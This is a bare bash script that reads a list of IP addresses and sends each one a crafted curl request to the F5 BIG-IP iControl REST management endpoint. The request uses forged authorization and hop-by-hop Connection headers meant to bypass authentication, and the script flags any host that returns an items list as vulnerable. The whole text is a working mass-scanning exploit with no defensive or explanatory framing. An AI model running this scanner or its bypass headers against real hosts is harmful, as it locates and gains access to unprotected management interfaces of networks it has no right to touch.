while read HOST; do 
if curl -s https://$HOST/mgmt/tm --max-time 3 --insecure -H "Authorization: Basic YWRtaW46" -H "X-F5-Auth-Token: 1" -H "Connection: X-Forwarded-Host, X-F5-Auth-Token" -H "Content-Length: 0" | grep -q "\"items\":\["; then printf "\n[*] $HOST is vulnerable\n"; else printf "\n[*] $HOST doesn't appear vulnerable\n"; 
fi
done < list_ip